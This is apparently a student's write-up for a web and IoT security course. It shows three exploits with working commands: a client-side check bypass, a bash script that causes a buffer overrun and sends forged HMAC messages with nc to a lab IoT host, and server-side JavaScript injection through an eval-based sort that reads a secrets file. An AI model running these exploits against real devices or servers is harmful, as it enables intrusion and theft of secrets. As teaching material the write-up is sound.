# Assignment 3 - More Web and IoT Insecurity
## Part A. Bypassing client-side checks
Using Google Chrome developer tools:

1) Add `tikinmusta` to the drop-down menu and then select it.

2) Remove the `EventHandler` that checks the username length condition. Now you should be able to submit new username that is over 21 characters long such as `testingover20characterslong`.


## Part B. Buffer overrun
1) Save the message into a file `msg.in`.
    - ```<user>;<command>;<hex_hmac><lf> > /tmp/msg.in```
    - `<keyphrase>`: `??`, length `KEYLEN=20`
    - `<user>`: `452056`
    - `<command>`: `???`
        - Include the exploit to overwrite `<keyphrase>` using buffer overrun.
        - Expected input length is `MAXCMDLEN`.
        -
    - `<hex_hmac>`: HMAC in hexadecimal format using OpenSSL
        - `openssl dgst -sha256 -hmac <keyphrase> /tmp/string.in`
        - `/tmp/string.in` file contains: `ClientCmd|<user>|<command>`, where `ClientCmd` is a constant string. Expected to be of size `MAXHMACINPUTLEN`
2) Send the command into the IoT device
    - ```nc device1.vikaa.fi 33892 < /tmp/msg.in```

Make this overrun
```c
sprintf(hmac_input, "%s|%s|%s", CLIENTCMDTAG, user_rec, command_rec);
```
- `hmac_input` is allocated 40 characters
- `CLIENTCMDTAG` is 9 characters long
- `user_rec` is 6 characters long
- Two vertical bars `|` take 2 characters

```bash
# Keyphrase need to be 20 characters long.
KEYPHRASE=01234567890123456789
USERNAME=452056
# Length of the command needs to make the buffer to overrun.
# 22 characters + keyphrase
COMMAND=0123456789012345678901${KEYPHRASE}

echo "ClientCmd|${USERNAME}|${COMMAND}" > /tmp/string.in
HEX_HMAC = $(openssl dgst -sha256 -hmac ${KEYPHRASE} /tmp/string.in)

echo "${USERNAME};${COMMAND};${HEX_HMAC}" > /tmp/msg.in
nc device1.vikaa.fi 33892 < /tmp/msg.in
```

## Part C. Server-side poisoning
```js
// ...
// Plants that will be returned to the client
var retPlants = [];
bookshelf.knex.raw(sql_query).then(function(plants){
    plants.forEach(function(p){
        retPlants.push({
            ’name’:p.name,
            ’color’:p.color,
            ’planttype’:p.planttype,
            ’potsize’:p.potsize
        });
    });
    // Field name from drop - down selection
    var field = req.body.sort_field;
    // Sort the plants
    retPlants.sort(function(a,b){
        var av,bv;
        with (a) { av = eval(field); };
        with (b) { bv = eval(field); };
        return av >= bv ;
    });
    // ...
});
```

Inject javascript into the `sort by` field by adding options using developer tools.

1) List the contents of the current directory:

    ```js
    res.end(require('fs').readdirSync('.').toString())
    ```
    ```txt
    .gitignore,__init__.py,config,models,node_modules,package-lock.json,
    package.json,potplant.db,public,routes,secrets,server.js,utils,views
    ```

2) List the contents of the `secrets` directory:

    ```js
    res.end(require('fs').readdirSync('secrets').toString())
    ```
    ```txt
    secretmessage_3096.txt
    ```

3) View the actual content of the `secrets/secretmessage_3096.txt` file:

    ```js
    res.end(require('fs').readFileSync('secrets/secretmessage_3096.txt'))
    ```
    ```txt
    Instructions from boss: code ecc35a2dbf4a0e06 for agent 452056.
    ```

## References

https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html
